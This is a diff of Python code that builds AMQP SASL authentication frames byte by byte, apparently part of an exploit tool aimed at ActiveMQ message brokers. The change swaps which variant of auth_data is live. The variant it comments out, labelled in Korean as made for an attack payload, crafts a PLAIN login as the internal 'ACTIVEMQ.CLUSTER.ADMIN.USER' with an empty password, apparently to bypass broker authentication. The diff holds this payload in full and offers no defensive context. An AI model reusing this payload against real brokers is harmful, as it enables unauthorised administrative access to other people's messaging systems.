@@ -140,27 +140,26 @@ class SASLInit:
 
         self.SASL_Mechanisms = SASL_Mechanisms
 
-    # def auth_data(self):
-    #     #todo 임시 제작
-    #     # SASL PLAIN
-    #     # auth_str = f"\0{username}\0{password}"
-    #     Mechanisms = [mechanism.decode() for mechanism in self.SASL_Mechanisms.Mechanisms]
-    #     if Mechanisms[0] == "PLAIN":
-    #         id = Mechanisms[1] # ANONYMOUS
-    #         pw = Mechanisms[1].lower()
-    #         data = b"\xa3\x09" + id.encode() + b"\xa0\x09" + pw.encode()
-    #     return data
-
     def auth_data(self):
-        #todo 임시 제작
         # SASL PLAIN
         # auth_str = f"\0{username}\0{password}"
+        Mechanisms = [mechanism.decode() for mechanism in self.SASL_Mechanisms.Mechanisms]
+        if Mechanisms[0] == "PLAIN":
+            id = Mechanisms[1] # ANONYMOUS
+            pw = Mechanisms[1].lower()
+            data = b"\xa3\x09" + id.encode() + b"\xa0\x09" + pw.encode()
+        return data
 
-        PLAIN = b"\xa3\x05PLAIN"
-        payload = b"ACTIVEMQ.CLUSTER.ADMIN.USER" + b"\x00"+ b"\x00"
-        payload = b"\xa0" + len(payload).to_bytes(byteorder="big") + payload
-        payload = PLAIN + payload
-        return payload
+    # def auth_data(self):
+    #     #공격 페이로드를 위해서 임시 제작
+    #     # SASL PLAIN
+    #     # auth_str = f"\0{username}\0{password}"
+    #
+    #     PLAIN = b"\xa3\x05PLAIN"
+    #     payload = b"ACTIVEMQ.CLUSTER.ADMIN.USER" + b"\x00"+ b"\x00"
+    #     payload = b"\xa0" + len(payload).to_bytes(byteorder="big") + payload
+    #     payload = PLAIN + payload
+    #     return payload
 
     def create_sasl_init(self):
         SASL_Init = self.Doff.to_bytes(1, byteorder="big")
